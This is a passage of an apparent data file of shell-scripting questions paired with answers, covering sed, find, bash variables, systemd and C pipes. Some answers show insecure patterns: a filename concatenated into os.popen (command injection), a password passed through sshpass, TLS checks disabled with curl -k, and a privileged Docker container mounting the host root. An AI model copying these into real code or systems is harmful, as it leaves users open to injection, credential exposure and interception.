[\"video/x-sgi-movie\",\"movie\"],\n    [\"x-conference/x-cooltalk\",\"ice\"]]\n\n#NOTE: take only the first extension\nmime2ext = dict(x[:2] for x in mime2exts_list)\n\nif __name__ == '__main__':\n    import fileinput, os.path\n    from subprocess import Popen, PIPE\n\n    for filename in (line.rstrip() for line in fileinput.input()):\n        output, _ = Popen(['file', '-bi', filename], stdout=PIPE).communicate()\n        mime = output.split(';', 1)[0].lower().strip()\n        print filename + os.path.extsep + mime2ext.get(mime, 'undefined')\nHere's a snippet for old python's versions (not tested):\n#NOTE: take only the first extension\nmime2ext = {}\nfor x in mime2exts_list:\n    mime2ext[x[0]] = x[1]\n\nif __name__ == '__main__':\n    import os\n    import sys\n\n    # this version supports only stdin (part of fileinput.input() functionality)\n    lines = sys.stdin.read().split('\\n')\n    for line in lines:\n        filename = line.rstrip()\n        output = os.popen('file -bi ' + filename).read()        \n        mime = output.split(';')[0].lower().strip()\n        try: ext = mime2ext[mime]\n        except KeyError:\n             ext = 'undefined'\n        print filename + '.' + ext\nIt should work on Python 2.3.5 (I guess).",
    "How do I compare strings in Bourne Shell?": "Use the Unix tools. The program cut will happily shorten a string.\nif [ \"$(echo $var1 | cut -c 4)\" = \"mtu \" ];\n... should do what you want.",
    "npx: the shell-auto-fallback argument has been removed": "Per the Readme for npx plugin in OhMyZsh github repo,\nSince npm v7, npx has been moved to npm exec. With the move, the --shell-auto-fallback argument for npx has been removed:\nShell fallback functionality is removed, as it is not advisable.\nWhen using npm v7, you'll get this error:\nnpx: the --shell-auto-fallback argument has been removed\nIf you get this error, just disable the plugin by removing it from the plugins array in your zshrc file. This plugin will no longer be maintained and will be removed in the future, when the older npx versions are no longer available.\nAs suggested, try removing npx from the following line in your .zshrc\nplugins=(alias-finder brew common-aliases copydir copyfile docker docker-compose dotenv encode64 extract git jira jsontools node npm npx osx urltools vi-mode vscode web-search z)\n.. also remove the last two line in your .zshrc\n# NPX auto-fallback\nsource <(npx --shell-auto-fallback zsh)",
    "Send password when using scp to copy files from one server to another [duplicate]": "Just pass with sshpass -p \"your password\" at the beginning of your scp command\nsshpass -p \"your password\" scp ./abc.txt hostname/abc.txt",
    "nohup VERBOSE=1 perl script.pl": "Set the environment variable before calling nohup, and it will be preserved when nohup exec()s (replaces itself with) perl.\n$ VERBOSE=1 nohup perl myscript.pl params ...",
    "Change width of man command ouput": "That's an environment variable.\nTry:\nMANWIDTH=80\nexport MANWIDTH\nman bash\nIf you want that set permanently then you can add those first two lines to your shell session startup scripts or similar.",
    "UNIX 'ls' command - wildcard 'OR' operator": "Providing you're wanting to match exact dates (which it appears you are), the way to so with bash expansion is:\nls -l *201206{19,20,21}*",
    "Shell adding a sleep and loop": "Enclose the code in a while like this:\nwhile :\ndo\n    your_code\n    sleep 600\ndone",
    "Remove ^H and ^M characters from a file using Linux shell scripting": "What you're seeing there are control characters, you simply could delete them with tr\ncat your_file |\ntr -d '\\b\\r'\nthis is better:\ntr -d '\\b\\r' < your_file",
    "How to append something at the end of a certain line of the text": "I'd probably go for John's sed solution but, since you asked about awk as well:\n$ echo 'Line1:  I just want to make clear of the problem\nLine2:  Thanks to all who look into my problem\nLine3:  How to solve the problem?\nLine4:  Thanks to all.' | awk '/^Line2:/{$0=$0\" Please help me\"}{print}'\nThis outputs:\nLine1:  I just want to make clear of the problem\nLine2:  Thanks to all who look into my problem Please help me\nLine3:  How to solve the problem?\nLine4:  Thanks to all.\nAn explanation as to how it works may be helpful. Think of the awk script as follows with conditions on the left and commands on the right:\n/^Line2:/ {$0=$0\" Please help me\"}\n          {print}\nThese two awk clauses are executed for every single line processed.\nIf the line matches the regular expression ^Line2: (meaning \"Line2:\" at the start of the line), you change $0 by appending your desired string ($0 is the entire line as read into awk).\nIf the line matches the empty condition (all lines will match this), print is executed. This outputs the current line $0.\nSo you can see it's just a simple program which modifies the line where necessary and outputs the line, modified or not.\nIn addition, you may want to use /^Line2:/ as the key even for a sed solution so you don't pick up Line2 in the middle of the text or Line20 through Line29, Line200 through Line299 and so on:\nsed '/^Line2:/s/$/ Please help me/'",
    "I have to type export PATH=~/anaconda/bin:\"$PATH\" everytime I rerun the terminal": "Try this in .bash_profile\nexport PATH=\"$HOME/anaconda/bin:$PATH\"\nThen try launching a new terminal and running:\necho $PATH\nThe output should start with /anaconda/bin:\nIf that still doesn't work... A work around might be to invoke bash after running terminal i.e. type \"bash\". Which should cause bash to launch with .bash_profile",
    "How to find all files which are basically soft or hard links of other directories or files on linux?": "Finding symlinks is easy:\n% find . -type l\nFinding hard links is tricky, because if a subdirectory of the directory in question also has subdirectories then those increase the hard link count. That's how subdirectories are linked to their parents in UNIX (it's the .. entry in each subdirectory).\nIf you only want to find linked files (and not directories), this will work:\n% find . -type f \\! -links 1\nThis works because a file that does have hard links will have a link count > 1, and unlinked file has a link count == 1, hence this command looks for all files whose link count <> 1\nAlternatively, on newer versions of find you could use:\n% find . -type f -links +1\nThis works for the same reason as above; however, newer versions of find can take +n or -n instead of just a number. This is equivalent to testing for greater than n or less than n, respectively.",
    "How to change build setting versioning in Xcode 11 using script?": "update 2022/08/19\nif using fastlane to bumping version\ndesc \"Bump version and build nubmer\"\nlane :bump_version_and_build_number do |options|\n    version_number = options[:version]\n    puts version_number\n    sh(\"sed -i '' -e 's/MARKETING_VERSION \\\\= [^\\\\;]*\\\\;/MARKETING_VERSION = #{version_number};/' ../${YOUR_PROJECT_NAME}.xcodeproj/project.pbxproj\")\n    increment_build_number\nend\nand just type in commend line\nbundle exec fastlane bump_version_and_build_number version:1.0.1\nokey I find a solution for myself, and thanks to an friend from meetup.\nfor Version number I used sed -i '' -e 's/MARKETING_VERSION \\= [^\\;]*\\;/MARKETING_VERSION = 3.4.5;/' ${YOUR_PROJECT_NAME}.xcodeproj/project.pbxproj\ne.g. sed -i '' -e 's/MARKETING_VERSION \\= [^\\;]*\\;/MARKETING_VERSION = 3.4.5;/' DemoProject.xcodeproj/project.pbxproj\nnote that this can't work in pre-action of scheme setting\nAs for Build version I used xcrun agvtool new-version xxx\ne.g. xcrun agvtool new-version 3.4.5b\nyou can write these command in Build Phases\nthe reason I don't use xcrun agvtool new-marketing-version 3.4.5b is because it will write solid number into plist.\nAnd I agree with Manuel's answer in Post\nWith these I can manage multi-targets' versioning\np.s. If you want to do that to, for example, notificationService target, remember to change version and build number manual at first to make Xcode 11 change the corresponding value to an variable like this\nor you can make that by edit plist in source code of course.\nThat's the closest method I achieve to manage multi-target versioning so far.",
    "How to get basename of parent's parent's directory name in shell?": "I suggest to use basename and dirname:\nbasename $(dirname $(dirname \"$PWD\"))",
    "find and replace string in a file": "Use the -i option of sed to make the changes in place:\nsed -i \"s/$OLD/$NEW/g\" \"$f\"\n    ^^",
    "Detect if current connection is metered with NetworkManager": "With the nmcli utility, the necessary steps are:\nverify NetworkManager is version 1.0.6+:\n$ nmcli -v\nnmcli tool, version 1.9.0\ncheck GENERAL.METERED on an interface:\n$ nmcli -t -f GENERAL.METERED dev show eth1\nGENERAL.METERED:unknown\nvalues are: unknown, yes, no, yes (guessed), no (guessed)\nForcing the value is done like this:\n$ nmcli dev modify wlan1 connection.METERED yes\n Connection successfully reapplied to device 'wlan1'\n $ nmcli -t -f GENERAL.METERED dev show wlan1\n GENERAL.METERED:yes\nAnd, to get a list grouped by device:\n  $ nmcli -t -f GENERAL.DEVICE,GENERAL.METERED dev show\n\n  GENERAL.DEVICE:wlan1\n  GENERAL.METERED:yes\n\n  GENERAL.DEVICE:eth1\n  GENERAL.METERED:unknown\n\n  GENERAL.DEVICE:lo\n  GENERAL.METERED:unknown\nTrying to cut this down to info on just the default route would still require a call to another command as NetworkManager doesn't try to distinguish between multiple devices in a connected state:\n  $ nmcli -t -f GENERAL.DEVICE,GENERAL.METERED dev show `ip route list 0/0 | sed -r 's/.*dev (\\S*).*/\\1/g'`",
    "How to enable python repl autocomplete and still allow new line tabs": "You should just use IPython. It has both tab completion and auto-indenting of for loops or function definitions. For example:\n# Ipython prompt\nIn [1]: def stuff(x):\n   ...:     |\n#           ^ cursor automatically moves to this position\nTo install it, you can use pip:\npip install ipython\nIf you don't have pip installed, you can follow the instructions on this page. On python >= 3.4, pip is installed by default.\nIf you're on windows, this page contains installers for ipython (and many other python libraries that may be difficult to install).\nHowever, if for any reason you can't install ipython, Brandon Invergo had created a python start-up script that adds several features to the python interpreter, among which is auto indentation. He has released it under GPL v3 and published the source here.\nI've copied the code that handles the auto-indentation below. I had to add indent = '' at line 11 to make it work on my python 3.4 interpreter.\nimport readline\n\ndef rl_autoindent():\n    \"\"\"Auto-indent upon typing a new line according to the contents of the\n    previous line.  This function will be used as Readline's\n    pre-input-hook.\n\n    \"\"\"\n    hist_len = readline.get_current_history_length()\n    last_input = readline.get_history_item(hist_len)\n    indent = ''\n    try:\n        last_indent_index = last_input.rindex(\"    \")\n    except:\n        last_indent = 0\n    else:\n        last_indent = int(last_indent_index / 4) + 1\n    if len(last_input.strip()) > 1:\n        if last_input.count(\"(\") > last_input.count(\")\"):\n            indent = ''.join([\"    \" for n in range(last_indent + 2)])\n        elif last_input.count(\")\") > last_input.count(\"(\"):\n            indent = ''.join([\"    \" for n in range(last_indent - 1)])\n        elif last_input.count(\"[\") > last_input.count(\"]\"):\n            indent = ''.join([\"    \" for n in range(last_indent + 2)])\n        elif last_input.count(\"]\") > last_input.count(\"[\"):\n            indent = ''.join([\"    \" for n in range(last_indent - 1)])\n        elif last_input.count(\"{\") > last_input.count(\"}\"):\n            indent = ''.join([\"    \" for n in range(last_indent + 2)])\n        elif last_input.count(\"}\") > last_input.count(\"{\"):\n            indent = ''.join([\"    \" for n in range(last_indent - 1)])\n        elif last_input[-1] == \":\":\n            indent = ''.join([\"    \" for n in range(last_indent + 1)])\n        else:\n            indent = ''.join([\"    \" for n in range(last_indent)])\n    readline.insert_text(indent)\n\nreadline.set_pre_input_hook(rl_autoindent)",
    "Use of read-only variables in shell scripts [closed]": "It sounds like you might think that readonly does more than it really does. For one thing, readonly status is not exported into the environment or inherited by child processes:\n$ declare -rx LOGS=hello\n$ LOGS=goodbye\nbash: LOGS: readonly variable\n$ bash -c 'echo \"$LOGS\"'\nhello\n$ bash -c 'LOGS=goodbye; echo \"$LOGS\"'\ngoodbye\n$ ",
    "\"[ ]\" vs. \"[[ ]]\" in Bash shell [duplicate]": "[[ is a bash built-in, and cannot be used in a #!/bin/sh script. You'll want to read the Conditional Commands section of the bash manual to learn the capabilities of [[. The major benefits that spring to mind:\n== and != perform pattern matching, so the right-hand side can be a glob pattern\n=~ performs regular expression matching. Captured groups are stored in the BASH_REMATCH array.\nboolean operators && and ||\nparenth\u00e8ses for grouping of expressions.\nno word splitting, so it's not strictly necessary to quote your variables.\nThe major drawback: your script is now bash-specific.",
    "How to expand a CMD shell variable twice (recursively)": "Thinking in terms of a less tortuous solution, this, too, produces the CCC you desire.\nsetlocal enabledelayedexpansion\nset AAA=BBB\nset BBB=CCC\nfor /F  %%a in ('echo %AAA%') do  echo !%%a!\nedit:\nto dissect this answer:\nsetlocal enabledelayedexpansion - this will allow for any environment variable setting during your bat to be used as modified during the process of your for loop.\nset AAA=BBB, set BBB=CCC - your data population set statements\nfor /F  %%a in ('echo %AAA%') do  echo !%%a! - This tells the processor to loop, albeit only once, and take out the first token that is returned (default delimiter of space and tab apply) from the running of the command in the parens and put it in the var %%a (outside of a batch, a single % will do). If you specify that var as %%a, you need to use %%a in your do block. Likewise, if you specify %%i, use %%i in your do block. Note that to get your environment variable to be resolved within the do block of the for loop, you need surround it in !'s. (you don't need to in the in block, as I originally posted - I have made that change in my edit).\nedit:\nYou were very close with your updated example. Try it like this:\n@echo off\nsetlocal enabledelayedexpansion\nset LIST=BBB CCC DDD\nset BBB=111\nset CCC=222\nset DDD=333\n\nfor %%i in (%LIST%) do (\n    for /F %%a in ('echo %%i') do echo !%%a!\n)\nThe difference between your update and this is that you were trying to echo the environment variable in the in set with in ('echo %%%i%'), but without the !'s for the delayed expansion of set variables. Were you to use in ('echo !%%i!'), you would see your BBB, CCC, and DDD variables resolved, but then the do block of your inner loop wouldnt have anything to resolve - you dont have any 111 environment variables. With that in mind, you could simplify your loop with the following:\n@echo off\nsetlocal enabledelayedexpansion\nset LIST=BBB CCC DDD\nset BBB=111\nset CCC=222\nset DDD=333\n\nfor %%i in (%LIST%) do (echo !%%i!)",
    "While executing shell scripts, how to know which line number it's executing,": "You can set the PS4 variable to cause set -x output to include the line number:\nPS4=':${LINENO}+'\nset -x\nThis will put the line number before each line as it executes:\n:4+command here\n:5+other command\nIt's important to have some sigil character (such as a + in my examples) after your variable expansions in PS4, because that last character is repeated to show nesting depth. That is, if you call a function, and that function invokes a command, the output from set -x will report it like so:\n:3+++command run within a function called from a function\n:8++command run within a function\n:19+line after the function was called\nIf multiple files are involved in running your script, you might want to include the BASH_SOURCE variable as opposed to only LINENO (assuming this really is a bash script, as opposed to /bin/sh -- be sure your script starts with #!/bin/bash!):\nPS4=':${BASH_SOURCE}:${LINENO}+'\nset -x",
    "Implementation of multiple pipes in C": "I believe the issue here is that your waiting and closing inside the same loop that's creating children. On the first iteration, the child will exec (which will destroy the child program, overwriting it with your first command) and then the parent closes all of its file descriptors and waits for the child to finish before it iterates on to creating the next child. At that point, since the parent has closed all of its pipes, any further children will have nothing to write to or read from. Since you are not checking for the success of your dup2 calls, this is going un-noticed.\nIf you want to keep the same loop structure, you'll need to make sure the parent only closes the file descriptors that have already been used, but leaves those that haven't alone. Then, after all children have been created, your parent can wait.\nEDIT: I mixed up the parent/child in my answer, but the reasoning still holds: the process that goes on to fork again closes all of its copies of the pipes, so any process after the first fork will not have valid file descriptors to read to/write from.\npseudo code, using an array of pipes created up-front:\n/* parent creates all needed pipes at the start */\nfor( i = 0; i < num-pipes; i++ ){\n    if( pipe(pipefds + i*2) < 0 ){\n        perror and exit\n    }\n}\n\ncommandc = 0\nwhile( command ){\n    pid = fork()\n    if( pid == 0 ){\n        /* child gets input from the previous command,\n            if it's not the first command */\n        if( not first command ){\n            if( dup2(pipefds[(commandc-1)*2], 0) < ){\n                perror and exit\n            }\n        }\n        /* child outputs to next command, if it's not\n            the last command */\n        if( not last command ){\n            if( dup2(pipefds[commandc*2+1], 1) < 0 ){\n                perror and exit\n            }\n        }\n        close all pipe-fds\n        execvp\n        perror and exit\n    } else if( pid < 0 ){\n        perror and exit\n    }\n    cmd = cmd->next\n    commandc++\n}\n\n/* parent closes all of its copies at the end */\nfor( i = 0; i < 2 * num-pipes; i++ ){\n    close( pipefds[i] );\n}\nIn this code, the original parent process creates a child for each command and therefore survives the entire ordeal. The children check to see if they should get their input from the previous command and if they should send their output to the next command. Then they close all of their copies of the pipe file descriptors and then exec. The parent doesn't do anything but fork until it's created a child for each command. It then closes all of its copies of the descriptors and can go on to wait.\nCreating all of the pipes you need first, and then managing them in the loop, is tricky and requires some array arithmetic. The goal, though, looks like this:\ncmd0    cmd1   cmd2   cmd3   cmd4\n   pipe0   pipe1  pipe2  pipe3\n   [0,1]   [2,3]  [4,5]  [6,7]\nRealizing that, at any given time, you only need two sets of pipes (the pipe to the previous command and the pipe to the next command) will simplify your code and make it a little more robust. Ephemient gives pseudo-code for this here. His code is cleaner, because the parent and child do not have to do unnecessary looping to close un-needed file descriptors and because the parent can easily close its copies of the file descriptors immediately after the fork.\nAs a side note: you should always check the return values of pipe, dup2, fork, and exec.\nEDIT 2: typo in pseudo code. OP: num-pipes would be the number of pipes. E.g., \"ls | grep foo | sort -r\" would have 2 pipes.",
    "How do I get the window handle of the desktop?": "In light of a recent discussion on Meta complaining that questions like this one have \"not been properly answered\", I'm going to try and give answering this one a whirl. Not to imply that I think meklarian's answer is bad\u2014in fact, far from it. But it's clearly been deemed unsatisfactory, so perhaps I can fill in some of the additional details.\nYour problem results from a fairly widespread confusion over what the desktop window actually is. The GetDesktopWindow function does precisely what it's documented to do: it returns a handle to the desktop window. This, however, is not the same window that contains the desktop icons. That's a completely different window that appeared for the first time in Windows 95. It's actually a ListView control set to the \"Large Icons\" view, with the actual desktop window as its parent.\nRaymond Chen, a developer on the Windows Shell team provides some additional detail in the following Windows Confidential article: Leftovers from Windows 3.0\n[ . . . ]  While in Windows 3.0, icons on the desktop represented minimized windows, in Windows 95, the desktop acted as an icon container.\nThe Windows 95 desktop was actually a window created by Explorer that covered your screen (but sat beneath all the other windows on your desktop). That was the window that displayed your icons. There was still a window manager desktop window beneath that (the window you get if you call Get\u00adDesktop\u00adWindow), but you never saw it because it was covered by the Windows 95 desktop\u2014the same way that the wood paneling in the basement of my colleague\u2019s house covered the original wall and the time capsule behind the wall.\n[ . . . ]\nThis desktop design has remained largely unchanged since its introduction in Windows 95. On a typical machine, the original desktop is still there, but it\u2019s completely covered by the Explorer desktop.\nIn summary, then, the window returned by the GetDesktopWindow function is the actual desktop window, the only one we had way back in Windows 3.0. The Explorer desktop (the one that contains all your icons) is merely another window sitting on top of the desktop window (although one that completely covers the original) that wasn't added until Windows 95.\nIf you want to get a handle to the Explorer desktop window, you need to do some additional work beyond simply calling the GetDesktopWindow function. In particular, you need to traverse the child windows of the actual desktop window to find the one that Explorer uses to display icons. Do this by calling the FindWindowEx function to get each window in the hierarchy until you get to the one that you want. It has a class name of SysListView32. You'll also probably want to use the GetShellWindow function, which returns a handle to the Shell's desktop window, to help get you started.\nThe code might look like this (warning: this code is untested, and I don't recommend using it anyway!):\nHWND hShellWnd = GetShellWindow();\nHWND hDefView = FindWindowEx(hShellWnd, NULL, _T(\"SHELLDLL_DefView\"), NULL);\nHWND folderView = FindWindowEx(hDefView, NULL, _T(\"SysListView32\"), NULL);\nreturn folderView;\nI noted there that I don't actually recommend using that code. Why not? Because in almost every case that you want to get a handle to the desktop window (either the actual desktop window, or the Explorer desktop), you're doing something wrong.\nThis isn't how you're supposed to interact with the desktop window. In fact, you're not really supposed to interact with it at all! Remember how you learned when you were a child that you're not supposed to play with things that belong to other people without their permission? Well, the desktop belongs to Windows (more specifically, to the Shell), and it hasn't given you permission to play with its toys! And like any good child, the Shell is subject to throwing a fit when you try to play with its toys without asking.\nThe same Raymond Chen has published another article on his blog that details a very specific case, entitled What's so special about the desktop window?\nBeyond the example he gives, this is fundamentally not the way to do UI automation. It's simply too fragile, too problematic, and too subject to breaking on future versions of Windows. Instead, define what it is that you're actually trying to accomplish, and then search for the function that enables you to do that.\nIf such a function does not exist, the lesson to be learned is not that Microsoft simply wants to make life harder for developers. But rather that you aren't supposed to be doing that in the first place.",
    "Using a user's .bashrc in a systemd service": "If you must...\nInstead of trying to generate an EnvironmentFile, have a shell execute your startup scripts and then execute your command. This avoids steps that can introduce a mismatch (as between how env stores your environment, and how the systemd EnvironmentFile option loads it).\nTo source your target user's startup scripts:\n[Service]\nType=simple\nUser=user\nGroup=user\nExecStart=/bin/bash -l -c 'exec \"$@\"' _ your-command arg1 arg2 ...\nTo source an arbitrary file:\nHere, instead of using bash -l to run a login shell, we explicitly source $0, and pass /home/user/.bashrc in that position.\n[Service]\nType=simple\nUser=user\nGroup=user\nExecStart=/bin/bash -c '. \"$0\" && exec \"$@\"' /home/user/.bashrc your-command arg1 arg2 ...\nBut Don't. Really.\n.bashrc files are generally intended for setting up interactive environments. This means that their settings are often not appropriate for services.\nBuilding a separate EnvironmentFile that you hand-audit for your service means you know exactly what the service is running with, and can configure it separately from the interactive environment. If you've hand-audited that EnvironmentFile to have the same meaning when executed by a shell, you could also run set -a; source /path/to/your-environment-file; set +a in your .bashrc to pull its environment variables in.\nFrom a security perspective, it's generally unwise to let a service modify any executable code it runs -- providing such permissions means that an attacker who has breached a service can make their breach persistent even without any secondary privilege escalation attacks. Using an EnvironmentFile in a non-user-writable location like /etc/conf.d is thus safer than a dotfile under that user's home directory.",
    "How to change picture background color using ImageMagick?": "I do not think you will get a perfect result due to the fact that your image is not binary. Nevertheless in Imagemagick you have two choices. First you could just change all white to red:\nconvert 20170916180007_833.png.jpeg -fuzz 25% -fill red -opaque white -flatten result1.png\nOr you can do a flood fill to just change the outer area:\nconvert 20170916180007_833.png.jpeg -fuzz 25% -fill none -draw \"matte 0,0 floodfill\" -background red -flatten result2.jpg",
    "chmod: How to recursively add execute permissions only to files which already have execute permission [closed]": "Use find:\nfind . -perm /u+x -execdir chmod a+x {} \\;",
    "How to receive arguments via shell pipe in python?": "import sys\nfor line in sys.stdin:\n    print line",
    "Running for loop terminal commands in Jupyter": "No need for subprocess or format. Something as simple as:\nfor idx in range(10):\n    !python process.py --filename /Users/images/{idx}.jpg\nworks for me.",
    "Determine the current user's shell": "$SHELL returns the shell of the current user:\n$ echo $SHELL\n/bin/zsh",
    "zsh: Expand a previous argument in the current command line": "In general, you can refer to individual words in the current command line using history expansion.\n$ cp /really/long/path/from/file.txt !#:1:s/from/to\nor\n$ cp /really/long/path/from/file.txt !#:$:s/from/to\nThe !# is history expansion for the command line typed so far. :1 specifies the first argument in that expansion (in ths case, the long file path). :$ could be used instead to refer to the last argument, independent of how many arguments have been typed so far. :s/from/to performs text substitution on the selected word.\nFor this task, you can also use brace expansion:\n$ cp /really/long/path/{from,to}/file.txt\n(Note: both of these are taken from bash, but also work in zsh. There may be other zsh-only tricks that I am not aware of.)",
    "Use output of bash command (with pipe) as a parameter for another command": "One usually uses xargs to make the output of one command an option to another command. For example:\n$ cat command1\n#!/bin/sh\n\necho \"one\"\necho \"two\"\necho \"three\"\n\n$ cat command2\n#!/bin/sh\n\nprintf '1 = %s\\n' \"$1\"\n\n$ ./command1 | xargs -n 1 ./command2\n1 = one\n1 = two\n1 = three\n$ \nBut ... while that was your question, it's not what you really want to know.\nIf you don't mind storing your tty in a variable, you can use bash variable mangling to do your substitution:\n$ tty=`tty`; who | grep -w \"${tty#/dev/}\"\nghoti            pts/198  Mar  8 17:01 (:0.0)\n(You want the -w because if you're on pts/6 you shouldn't see pts/60's logins.)\nYou're limited to doing this in a variable, because if you try to put the tty command into a pipe, it thinks that it's not running associated with a terminal anymore.\n$ true | echo `tty | sed 's:/dev/::'`\nnot a tty\n$ \nNote that nothing in this answer so far is specific to bash. Since you're using bash, another way around this problem is to use process substitution. For example, while this does not work:\n$ who | grep \"$(tty | sed 's:/dev/::')\"\nThis does:\n$ grep $(tty | sed 's:/dev/::') < <(who)",
    "How do you create a Shell Script target in Xcode 4.2?": "Select your project in the navigator\nClick \"Add Target\" - Choose \"Aggregate\" for an empty Target\nAdd Build Phase -> Add Run Script\nClick Build Phases and edit the Run Script Phase",
    "Start bash process with changed prompt PS1": "Another solution would be:\nbash --rcfile <(cat ~/.bashrc; echo 'PS1=\"change > \"')\nThis keeps the aliases and co by executing an \"extended\" version of the user's startup file.",
    "Sending ctrl-c to specific screen session": "I don't quite understand you but to send ctrl-c to a window in a screen session:\nscreen -S session_name -X at window_number stuff $'\\003'\n# or\nscreen -S session_name -X -p window_number stuff $'\\003'\nIf you want to send something to all the windows, use # (needs to be quoted) as the window_number.\nUPDATE:\nScreen's stuff command also supports the use of ^X (or ^x) to represent CTRL-X so the following command can also be used to send CTRL-C.\n# Here '^C' is two chars, '^' and 'C'\nscreen -S session_name -X at window_number stuff '^C'",
    "Surprise! the shell suggests command line switches": "You have discovered Bash's programmable completion feature.",
    "Is there any adb command to enable developer options?": "much easier way:\nadb shell settings put global development_settings_enabled 1",
    "Assigning one variable to another in Bash?": "To assign the value associated with the variable dest to the variable source, you need simply run dest=$source.\nFor example, to assign the value associated with the variable arg2 to the variable a:\na=ARG1\narg2=$a\necho \"ARG 2 = $arg2\"\nThe use of lower-case variable names for local shell variables is by convention, not necessity -- but this has the advantage of avoiding conflicts with environment variables and builtins, both of which use all-uppercase names by convention.",
    "Create directory in hadoop filesystem": "To leave safe mode, try below command since hadoop dfsadmin -safemode is deprecated in newer distribution of Hadoop:\n hdfs dfsadmin -safemode leave\nBy default, user's home directory in hdfs exists with '/user/hduser' not as /home/hduser'.\nIf you tried to create directory directly like below then it will be created like '/user/hduser/sampleDir'.\nhadoop fs -mkdir /path/to/be/created",
    "String length of bash": "This can be done natively in bash, no need to resort to expr\necho ${#Str}",
    "Function instead of alias in C shell login script": "Unfortunately, you can't define functions in csh, like you can in most other shells. This feature does not exist in csh.\nThe only alternative is to create a script and place it in a directory on your PATH e.g. ~/bin.",
    "Spark fails to start in local mode when disconnected [Possible bug in handling IPv6 in Spark??]": "OK, I seem to be able to get around it by passing configuration directly --conf spark.driver.host=localhost\nSo I run:\n./bin/spark-shell --conf spark.driver.host=localhost\nStill if there is a better solution, please let me know.\n[UPDATE]\nJacek Laskowski confirmed this is probably the only available solution for now.",
    "PHP - How to know if server allows shell_exec": "",
    "How to use quicklisp when CL program is invoked as a shell script?": "You are doing everything right.\nBasically, before you can use quicklisp, you need to load it (currently, it's not bundled with SBCL, although it may change in the future). There are various ways to do it. For example, you can load your .sbclrc with the quicklisp init:\n#!/usr/bin/sbcl --script\n(load \".sbclrc\")\n(load \"my-program.lisp\")\n(in-package :my-package)\n(my-main-method)\nor just paste those lines in your script, like you have suggested.",
    "using comm to diff two files": "To show the lines that exist in test2 but not in test1, write either of these:\ncomm -13 test1 test2\ncomm -23 test2 test1\n(-1 hides the column with lines that exist only in the first file; -2 hides the column with lines that exist only in the second file; -3 hides the column with lines that exist in both files.)\nAnd, vice versa to show the lines that exist in test1 but not in test2.\nNote that g on a line by itself is considered distinct from g with a space after it, which is why you get\ng\n    g \ninstead of\n        g",
    "How to access the docker VM (MobyLinux) filesystem from windows shell?": "Hack your way in\nrun a container with full root access to MobyLinuxVM and no seccomp profile (so you can mount stuff)\ndocker run --net=host --ipc=host --uts=host --pid=host -it --security-opt=seccomp=unconfined --privileged --rm -v /:/host alpine /bin/sh\nhttps://forums.docker.com/t/how-can-i-ssh-into-the-betas-mobylinuxvm/10991/6",
    "os.environ not setting environment variables [duplicate]": "os.environ[...] = ... sets the environment variable only for the duration of the python process (or its child processes).\nIt is not easily (i.e. without employing OS-specific tools) possible and surely not advisable to set the variable for the shell from which you run Python. See aumo's comment for alternative and somewhat obscure approaches to the problem.",
    "Running bash script does not return to terminal when using ampersand (&) to run a subprocess in the background": "What i ended up doing was to make to change parent.sh to the following\n#!/bin/bash\nchild.sh param1a param2a > startup.log &\nchild.sh param1b param2b > startup2.log &\nexit 0\nI would not have come to this solution without your suggestions and root cause analysis of the issue. Thanks!\nAnd apologies for my inaccurate comment. (There was no input, I answered from memory and I remembered incorrectly.)",
    "Use terminal to open a file by Excel on Mac": "Open a file by default application, just\nopen [path]\nIf want to change, can use\nopen -a [app-path] [file-path]\nFrom the man open page (more info on the -a option):\nDESCRIPTION\n     The open command opens a file (or a directory or URL), \n     just as if you had double-clicked the file's icon. If no application name\n     is specified, the default application as determined via LaunchServices is \n     used to open the specified files.\n\n     If the file is in the form of a URL, the file will be opened as a URL.\n\n     You can specify one or more file names (or pathnames), \n     which are interpreted relative to the shell or Terminal window's current \n     working directory. \n     For example, the following command would \n     open all Word files in the current working\n     directory:\n\n     open *.doc\n\n     Opened applications inherit environment variables just \n     as if you had launched the application directly through its full path.  \n     This behavior was also present in Tiger.\n\n     The options are as follows:\n\n     -a application\n         Specifies the application to use for opening the file",
    "Curl command for https ( SSL )": "if you're using a self signed certificate on the server, you can use:\ncurl -k https://example.com:8443/cli/agentCLI -u username:password\nbut be aware that then it's no better than using non SSL connection to the server, as your communication won't be secure anymore, enabling all sorts of man in the middle attacks.\nThough my advice to you is to download the .pem from the server:\nthat is usually found in /etc/ssl/ if you have access to the server,\nor that you can download,\nusing:\necho \"HEAD / HTTP/1.0\\n Host: example.com\\n\\n EOT\\n\" | openssl s_client -prexit -connect example.com:8443 > cert.pem\nto your computer, keep only the part between BEGIN CERTIFICATE and END CERTIFICATE within the file (including the BEGIN/END lines) and give it as parameter to the --cacert option, you might also download it. Then you'll get to authenticate your server each time you connect!\ncurl --cacert cert.pem https://example.com:8443/cli/agentCLI -u username:password\nTesting on my own self-signed server, it's working fine:\n% openssl s_client -showcerts -connect example.com:443 </dev/null 2>/dev/null | sed -n '/-----BEGIN CERTIFICATE-----/,/-----END CERTIFICATE-----/p' | grep -m1 -B-1 -- '-----END CERTIFICATE-----'  > cert.pem\n% curl --cacert cert.pem https://example.com\nfor an example that should be working:\n% openssl s_client -showcerts -connect git.cryptolib.org:443 </dev/null 2>/dev/null | sed -n '/-----BEGIN CERTIFICATE-----/,/-----END CERTIFICATE-----/p' | grep -m1 -B-1 -- '-----END CERTIFICATE-----'  > cert.pem\n% curl --cacert cert.pem https://git.cryptolib.org\ncurl: (51) SSL: certificate verification failed (result: 5)\nbut sadly it's not.\nI also tried to do, as suggested here:\n% openssl x509 -inform PEM -in cert.pem -text -out certdata.pem\n% curl --cacert certdata.pem https://git.cryptolib.org\nWhich is not working, because that site (git.cryptolib.org) I'm using for testing is not self-signed, but it's from the CACert chain, which can be solved by using the CACert root certificates, following this FAQ.\na few resources to dig:\nhttp://curl.haxx.se/docs/sslcerts.html\nhttp://curl.haxx.se/mail/archive-2012-01/0049.html\nhttps://turboflash.wordpress.com/2009/06/23/curl-adding-installing-trusting-new-self-signed-certificate/\nhttp://curl.haxx.se/docs/caextract.html\ncurl self-signed certificate web service over SSL\nBut no definitive answer so far :-s",
    "how to replace \"/\" in a POSIX sh string": "This parameter expansion is a bash extension to POSIX sh. If you review the relevant section of IEEE standard 1003.1, you'll see that it isn't a required feature, so shells which promise only POSIX compliance, such as ash, have no obligation to implement it, and no obligation for their implementations to hew to any particular standard of correctness should they do so anyhow..\nIf you want bash extensions, you need to use bash (or other ksh derivatives which are extended similarly).\nIn the interim, you can use other tools. For instance:\nstr=$(printf '%s' \"$str\" | tr '/' 'a')\nor\nstr=$(printf '%s' \"$str\" | sed -e 's@/@a@g')",
